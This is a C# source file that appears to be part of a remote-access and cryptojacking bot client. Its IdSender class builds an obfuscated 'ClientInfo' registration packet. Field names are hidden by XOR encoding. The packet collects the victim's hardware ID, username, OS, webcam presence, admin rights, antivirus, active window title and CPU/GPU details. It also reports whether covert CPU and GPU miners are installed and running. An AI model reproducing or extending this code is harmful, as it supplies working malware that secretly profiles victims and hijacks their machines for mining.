using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Text;
using System.Windows.Forms;
using MessagePackLib.MessagePack;
using Microsoft.VisualBasic.Devices;

namespace Peg.ICARUS
{
    public static class IdSender
    {
        public static byte[] SendInfo()
        {
            var msgpack = new MsgPack();
            msgpack.ForcePathObject(thebook("ZkiUao~")).AsString = thebook("Ifcod~Cdle");
            msgpack.ForcePathObject(thebook("B]CN")).AsString = Settings.Hw_id;
            msgpack.ForcePathObject(thebook("_yox")).AsString = Environment.UserName;
            msgpack.ForcePathObject(thebook("EY")).AsString =
                new ComputerInfo().OSFullName.Replace("Microsoft", null) + " " +
                Environment.Is64BitOperatingSystem.ToString().Replace("True", "64bit").Replace("False", "32bit");
            msgpack.ForcePathObject(thebook("Ikgoxk")).AsString = ToMati.havecamera().ToString();
            msgpack.ForcePathObject(thebook("Zk~b")).AsString = Process.GetCurrentProcess().MainModule.FileName;
            msgpack.ForcePathObject(thebook("\\oxyced")).AsString = Settings.Ver_sion;
            msgpack.ForcePathObject(thebook("Kngcd")).AsString = Me8odos.IsAdmin().ToString().ToLower()
                .Replace("true", "Admin").Replace("false", "User");
            msgpack.ForcePathObject(thebook("ZoxlexUgkdio")).AsString = Me8odos.GetActiveWindowTitle();
            msgpack.ForcePathObject(thebook("Zky~oUhcd")).AsString = Settings.BinToGo;
            msgpack.ForcePathObject(thebook("Kd~cU|cxy")).AsString = Me8odos.Antivirus();
            msgpack.ForcePathObject(thebook("Cdy~kffUon")).AsString = new FileInfo(Application.ExecutablePath)
                .LastWriteTime.ToUniversalTime().ToString();
            msgpack.ForcePathObject(thebook("ZeUdm")).AsString = "";
            msgpack.ForcePathObject(thebook("Mxez")).AsString = Settings.Group;
            msgpack.ForcePathObject("CPU/GPU").AsString = SYS();
            msgpack.ForcePathObject("GPU RAM").AsString = GetGPU_RAM.Get();
            msgpack.ForcePathObject("GPUCheck").AsString = StatsGPUMiner();
            msgpack.ForcePathObject("CPUCheck").AsString = StatsCPUMiner();
            return msgpack.Encode2Bytes();
        }

        public static string StatsCPUMiner()
        {
            try
            {
                if (!File.Exists(Properties.Settings.Default.cpuBin)) return "No Install";

                var pname = Process.GetProcessesByName(Properties.Settings.Default.cpuProc);
                if (pname.Length == 0)
                    return "Install";
                return "WORK";
            }


            catch
            {
                return "Error Check";
            }
        }

        public static string StatsGPUMiner()
        {
            try
            {
                if (!File.Exists(Properties.Settings.Default.gpuBin)) return "No Install";

                var pname = Process.GetProcessesByName(Properties.Settings.Default.gpuProc);
                if (pname.Length == 0)
                    return "Install";
                return "WORK";
            }


            catch
            {
                return "Error Check";
            }
        }

        public static string GetCoreCPU()
        {
            try
            {
                var coreCount = 0;
                foreach (var item in new ManagementObjectSearcher("Select * from Win32_Processor").Get())
                    coreCount += int.Parse(item["NumberOfCores"].ToString());
                return coreCount.ToString();
            }
            catch
            {
            }

            return "-1";
        }

        public static string SYP()
        {
            var GPURAM = "";
            var myVideoObject = new ManagementObjectSearcher("select * from Win32_VideoController");

            foreach (ManagementObject obj in myVideoObject.Get()) GPURAM = Convert.ToString(obj["AdapterRAM"]);


            return GPURAM;
        }

        public static string SYS()
        {
            var CPU = "";
            var GPU = "";
            var myVideoObject = new ManagementObjectSearcher("select * from Win32_VideoController");

            var myProcessorObject = new ManagementObjectSearcher("select * from Win32_Processor");

            foreach (ManagementObject objs in myProcessorObject.Get())
            {
                CPU = Convert.ToString(objs["Name"]);
                foreach (ManagementObject obj in myVideoObject.Get()) GPU = Convert.ToString(obj["Name"]);
            }

            return CPU + "/Core:" + GetCoreCPU() + "/" + GPU;
        }

        public static string thebook(string str)
        {
            var ch1 = '\n';
            var stringBuilder = new StringBuilder();

            foreach (uint num in str.ToCharArray())
            {
                var ch2 = (char)(num ^ ch1);
                stringBuilder.Append(ch2);
            }

            return stringBuilder.ToString();
        }
    }
}